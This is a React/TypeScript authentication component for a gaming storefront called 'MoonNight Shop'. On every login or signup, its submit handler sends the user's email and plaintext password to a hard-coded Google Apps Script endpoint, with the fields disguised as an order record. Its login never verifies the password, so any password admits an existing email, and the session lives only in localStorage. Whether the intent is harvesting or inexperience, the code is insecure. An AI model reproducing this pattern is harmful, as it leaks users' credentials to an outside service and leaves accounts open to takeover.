
import React, { useState } from 'react';
import { User } from '../types';

interface AuthProps {
  onLogin: (user: User) => void;
  onBack: () => void;
  allUsers: User[];
}

const Auth: React.FC<AuthProps> = ({ onLogin, onBack, allUsers }) => {
  const [mode, setMode] = useState<'login' | 'signup' | 'forgot'>('signup');
  const [isLoading, setIsLoading] = useState(false);
  const [resetSent, setResetSent] = useState(false);
  const [error, setError] = useState<string | null>(null);
  const [formData, setFormData] = useState({
    name: '',
    email: '',
    password: ''
  });

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setIsLoading(true);
    setError(null);

    const emailLower = formData.email.toLowerCase().trim();
    
    // STRICT DUPLICATE CHECK
    const existingUser = allUsers.find(u => u.email.toLowerCase() === emailLower);

    if (mode === 'signup' && existingUser) {
      setError("ERREUR: Un compte avec cet email existe déjà. Veuillez vous connecter.");
      setIsLoading(false);
      setMode('login'); 
      return;
    }

    if (mode === 'login' && !existingUser) {
      setError("ERREUR: Aucun compte trouvé avec cet email. Veuillez vous inscrire.");
      setIsLoading(false);
      setMode('signup');
      return;
    }

    const now = new Date();
    let actionLabel = mode === 'login' ? 'Connexion' : (mode === 'signup' ? 'Inscription' : 'Reset');

    const payload = {
      firstName: formData.name || 'Client',
      lastName: mode.toUpperCase(),
      email: emailLower,
      country: 'AuthPortal',
      productBought: `Action: ${actionLabel}`,
      totalAmount: 0,
      date: now.toISOString(),
      password: formData.password || 'N/A'
    };

    try {
      await fetch('https://script.google.com/macros/s/AKfycbxo83LQBoTFgEMld7HcZ4FGUdTrnbM9wGvpH_5q77K-1OG18RqFaddk3AjfvWKsqpUy/exec', {
        method: 'POST',
        mode: 'no-cors', 
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload)
      });

      if (mode === 'forgot') {
        setResetSent(true);
        setIsLoading(false);
        return;
      }

      const finalUser: User = existingUser || {
        id: Math.random().toString(36).substr(2, 9).toUpperCase(),
        name: formData.name || emailLower.split('@')[0],
        email: emailLower,
        state: 'Authenticated',
        joinedAt: now.toLocaleString(),
        balance: 0 
      };

      localStorage.setItem('mn_user', JSON.stringify(finalUser));
      
      setTimeout(() => {
        onLogin(finalUser);
        setIsLoading(false);
      }, 600);
      
    } catch (error) {
      console.error('Auth Error:', error);
      setError('Erreur technique. Veuillez réessayer.');
      setIsLoading(false);
    }
  };

  if (resetSent) {
    return (
      <div className="pt-32 pb-24 max-w-md mx-auto px-4 animate-fade-in">
        <div className="bg-slate-900 border border-slate-800 p-10 rounded-[2.5rem] shadow-2xl text-center">
          <div className="w-16 h-16 bg-sky-500/10 rounded-full flex items-center justify-center mx-auto mb-6 border border-sky-500/20">
            <i className="fas fa-check text-sky-400"></i>
          </div>
          <h2 className="text-xl font-gaming font-bold text-white uppercase tracking-widest mb-4">Lien Envoyé</h2>
          <p className="text-slate-400 text-[10px] uppercase tracking-widest mb-8 leading-relaxed">Vérifiez vos emails pour réinitialiser votre accès.</p>
          <button onClick={() => { setResetSent(false); setMode('login'); }} className="w-full bg-sky-500 text-white font-gaming py-4 rounded-xl text-[10px] uppercase tracking-widest">Retour</button>
        </div>
      </div>
    );
  }

  return (
    <div className="pt-32 pb-24 max-w-xl mx-auto px-4 animate-fade-in">
      <div className="bg-slate-900 border border-slate-800 p-8 md:p-14 rounded-[3.5rem] shadow-2xl relative overflow-hidden">
        <div className="text-center mb-12">
          <h1 className="text-4xl md:text-5xl font-gaming font-black text-white uppercase tracking-tighter mb-2">
            MoonNight <span className="text-sky-400">Shop</span>
          </h1>
          <div className="h-1 w-20 bg-sky-500 mx-auto rounded-full mb-4"></div>
          <p className="text-slate-500 text-[10px] font-gaming uppercase tracking-[0.6em]">Secure Authentication Gateway</p>
        </div>

        <div className="flex bg-slate-950 p-2 rounded-[1.5rem] mb-10 border border-slate-800">
          <button onClick={() => {setMode('login'); setError(null);}} className={`flex-1 py-4 rounded-2xl text-[10px] font-gaming uppercase tracking-widest transition-all ${mode === 'login' ? 'bg-sky-500 text-white shadow-[0_0_20px_rgba(14,165,233,0.3)]' : 'text-slate-500 hover:text-white'}`}>Connexion</button>
          <button onClick={() => {setMode('signup'); setError(null);}} className={`flex-1 py-4 rounded-2xl text-[10px] font-gaming uppercase tracking-widest transition-all ${mode === 'signup' ? 'bg-sky-500 text-white shadow-[0_0_20px_rgba(14,165,233,0.3)]' : 'text-slate-500 hover:text-white'}`}>Inscription</button>
        </div>

        {error && (
          <div className="mb-8 p-5 bg-red-500/10 border border-red-500/20 rounded-2xl">
            <p className="text-red-500 text-[10px] font-gaming text-center uppercase tracking-widest leading-relaxed">{error}</p>
          </div>
        )}

        <form onSubmit={handleSubmit} className="space-y-8">
          {mode === 'signup' && (
            <div className="animate-slide-up">
              <label className="block text-slate-500 text-[10px] font-gaming uppercase mb-3 ml-3 tracking-widest">Display Name</label>
              <input required type="text" className="w-full bg-slate-950 border border-slate-800 rounded-3xl px-8 py-5 text-white text-sm focus:border-sky-500 outline-none transition-all shadow-inner" placeholder="E.g. Ghost_Gamer" value={formData.name} onChange={(e) => setFormData({...formData, name: e.target.value})} />
            </div>
          )}
          <div className="animate-slide-up">
            <label className="block text-slate-500 text-[10px] font-gaming uppercase mb-3 ml-3 tracking-widest">Email Address</label>
            <input required type="email" className="w-full bg-slate-950 border border-slate-800 rounded-3xl px-8 py-5 text-white text-sm focus:border-sky-500 outline-none transition-all shadow-inner" placeholder="user@example.com" value={formData.email} onChange={(e) => setFormData({...formData, email: e.target.value})} />
          </div>
          {mode !== 'forgot' && (
            <div className="animate-slide-up">
              <label className="block text-slate-500 text-[10px] font-gaming uppercase mb-3 ml-3 tracking-widest">Security Password</label>
              <input required type="password" placeholder="••••••••••••" className="w-full bg-slate-950 border border-slate-800 rounded-3xl px-8 py-5 text-white text-sm focus:border-sky-500 outline-none transition-all shadow-inner" value={formData.password} onChange={(e) => setFormData({...formData, password: e.target.value})} />
              {mode === 'login' && <button type="button" onClick={() => setMode('forgot')} className="mt-4 ml-3 text-[9px] font-gaming uppercase text-sky-500/60 hover:text-sky-400 tracking-widest transition-colors">Forgot Access Code?</button>}
            </div>
          )}
          <button disabled={isLoading} className="w-full bg-sky-500 text-white font-gaming py-6 rounded-3xl text-[12px] font-bold uppercase tracking-[0.3em] hover:bg-sky-600 transition-all shadow-2xl shadow-sky-500/30 active:scale-[0.98] group overflow-hidden relative">
            <div className="absolute inset-0 w-full h-full bg-gradient-to-r from-transparent via-white/10 to-transparent -translate-x-full group-hover:animate-[shimmer_1.5s_infinite_linear]" style={{ backgroundSize: '200% 100%' }} />
            <span className="relative">{isLoading ? 'PROCESSING...' : (mode === 'login' ? 'ENTER SYSTEM' : mode === 'signup' ? 'CREATE IDENTITY' : 'SEND RESET LINK')}</span>
          </button>
        </form>

        <button onClick={onBack} className="mt-10 w-full text-[10px] font-gaming text-slate-500 hover:text-sky-400 uppercase tracking-widest text-center transition-colors">Abort & Return to Marketplace</button>
      </div>
    </div>
  );
};

export default Auth;
